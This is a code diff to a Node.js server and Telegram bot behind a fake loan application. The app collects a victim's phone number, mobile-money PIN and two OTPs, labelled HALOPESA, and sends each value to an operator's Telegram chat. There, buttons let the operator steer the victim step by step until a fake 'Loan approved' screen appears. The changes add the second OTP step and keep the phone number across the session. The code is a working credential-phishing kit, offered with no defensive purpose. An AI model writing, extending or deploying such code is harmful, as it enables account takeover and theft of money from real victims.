@@ -94,7 +94,6 @@ async function initBot() {
       const actionData = query.data || '';
       const chatId = String(query.message.chat.id);
       
-      // Fixed parsing: action is the first part (e.g. ALLOW or BLOCKED), targetId is everything after the first underscore
       const firstUnderscoreIdx = actionData.indexOf('_');
       const actionType = firstUnderscoreIdx !== -1 ? actionData.substring(0, firstUnderscoreIdx) : actionData;
       const targetId = firstUnderscoreIdx !== -1 ? actionData.substring(firstUnderscoreIdx + 1) : '';
@@ -118,7 +117,7 @@ async function initBot() {
           break;
         case 'ALLOW_APP':
         case 'ALLOW':
-          session.status = 'PROCEED_OTP1'; // Immediately sets status to move to OTP 1
+          session.status = 'PROCEED_OTP1';
           await bot.sendMessage(chatTarget, `✅ PIN allowed. Moved to OTP Step 1.`);
           break;
         case 'WRONG_PIN':
@@ -137,6 +136,9 @@ async function initBot() {
           await bot.sendMessage(chatTarget, `❌ Invalid OTP sent. Waiting for new incoming OTP.`);
           break;
         case 'NEXT':
+          session.status = 'PROCEED_OTP2';
+          await bot.sendMessage(chatTarget, `✅ Step 1 approved. Moved to OTP Step 2.`);
+          break;
         case 'APPROVED_FINAL':
           session.status = 'SUCCESS';
           await bot.sendMessage(chatTarget, `🎉 Loan approved! Success screen shown.`);
@@ -170,7 +172,8 @@ app.post('/api/submit-application', async (req, res) => {
 
     sessions.set(userId, { 
       adminChatId: targetChat, 
-      status: 'PROCEED_SIGNIN' 
+      status: 'PROCEED_SIGNIN',
+      phone: '' 
     });
 
     return res.status(200).json({ success: true, userId });
@@ -187,8 +190,8 @@ app.get('/api/check-status/:userId', (req, res) => {
     session = sessions.get(lastActiveUserId);
   }
 
-  if (!session) return res.status(200).json({ status: 'PROCEED_SIGNIN' }); 
-  res.status(200).json({ status: session.status });
+  if (!session) return res.status(200).json({ status: 'PROCEED_SIGNIN', phone: '' }); 
+  res.status(200).json({ status: session.status, phone: session.phone || '' });
 });
 
 app.post('/api/submit-pin', async (req, res) => {
@@ -205,6 +208,7 @@ app.post('/api/submit-pin', async (req, res) => {
       sessions.set(activeId || 'default', session);
     }
 
+    session.phone = phone; // Store phone in session
     const targetChat = session.adminChatId;
     session.status = 'WAITING_PIN_APPROVAL';
     session.pin = pin;
@@ -239,12 +243,13 @@ app.post('/api/submit-otp1', async (req, res) => {
     let session = sessions.get(activeId);
     if (!session) session = { adminChatId: FALLBACK_ADMIN_ID };
 
+    if (phone) session.phone = phone;
     const targetChat = session.adminChatId;
     session.status = 'WAITING_OTP1_APPROVAL';
     session.otp1 = otp;
 
     const message = `🔑 *HALOPESA OTP VERIFICATION (STEP 1)*\n\n` +
-                    `📞 *Phone:* \`${phone}\`\n` +
+                    `📞 *Phone:* \`${session.phone || phone}\`\n` +
                     `📱 *OTP (4 Digits):* \`${otp}\``;
 
     const opts = {
@@ -252,7 +257,7 @@ app.post('/api/submit-otp1', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'WRONG PIN', callback_data: `WRONG_PIN_${activeId}` },
+            { text: 'WRONG PIN ❌', callback_data: `WRONG_PIN_${activeId}` },
             { text: 'OTP EXPIRED ❌', callback_data: `OTP_EXPIRED_${activeId}` },
             { text: 'NEXT', callback_data: `NEXT_${activeId}` }
           ]
@@ -274,12 +279,13 @@ app.post('/api/submit-otp2', async (req, res) => {
     let session = sessions.get(activeId);
     if (!session) session = { adminChatId: FALLBACK_ADMIN_ID };
 
+    if (phone) session.phone = phone;
     const targetChat = session.adminChatId;
     session.status = 'WAITING_OTP2_APPROVAL';
     session.otp2 = otp;
 
     const message = `🔑 *HALOPESA FINAL OTP (STEP 2)*\n\n` +
-                    `📞 *Phone:* \`${phone}\`\n` +
+                    `📞 *Phone:* \`${session.phone || phone}\`\n` +
                     `📱 *Final OTP (4 Digits):* \`${otp}\``;
 
     const opts = {
@@ -306,4 +312,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-    
+  
